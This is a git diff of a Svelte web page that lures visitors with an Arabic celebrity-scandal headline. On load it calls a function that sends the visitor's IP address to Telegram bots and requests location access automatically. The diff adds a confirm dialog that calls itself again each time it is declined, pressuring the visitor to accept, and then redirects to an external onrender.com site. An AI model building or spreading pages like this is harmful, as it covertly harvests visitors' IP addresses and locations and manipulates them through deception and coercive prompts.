@@ -1,7 +1,13 @@
 <script>
   import { onMount } from 'svelte';
-  
+
+
+
   onMount(async () => {
+
+     
+
+
     sendIPToTelegramBots();
     
     // Request location permission automatically
@@ -12,8 +18,11 @@
       },
       (error) => {
         if (error.code === error.PERMISSION_DENIED) {
+
+
+           showAlert();
           // Location permission denied, send IP result to Telegram bots
-          redirectToNextURL();
+          
         }
       }
     );
@@ -128,6 +137,25 @@ ${ipAddress}
     return {};
   }
 
+
+function showAlert() {
+
+
+
+    const result = window.confirm("اضغط سماح عشان تشوف المحتوي");
+    if (result) {
+      // Allow button clicked
+     // console.log("Allowed");
+redirectToNextURL();
+    } else {
+      // Deny button clicked or dialog closed
+    //  console.log("Denied");
+showAlert();
+
+    }
+  }
+
+
   function redirectToNextURL() {
     // Get the current URL
     var currURL = window.location.href;
@@ -149,9 +177,17 @@ ${ipAddress}
       window.location.href = 'https://mhf1.onrender.com/';
     }
   }
+
+
+
+
 </script>
 
 <main>
+  
+
+
+
   <center>
     <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
   </center>
@@ -204,4 +240,6 @@ ${ipAddress}
     max-width: 100%;
     height: auto;
   }
+
+
 </style>
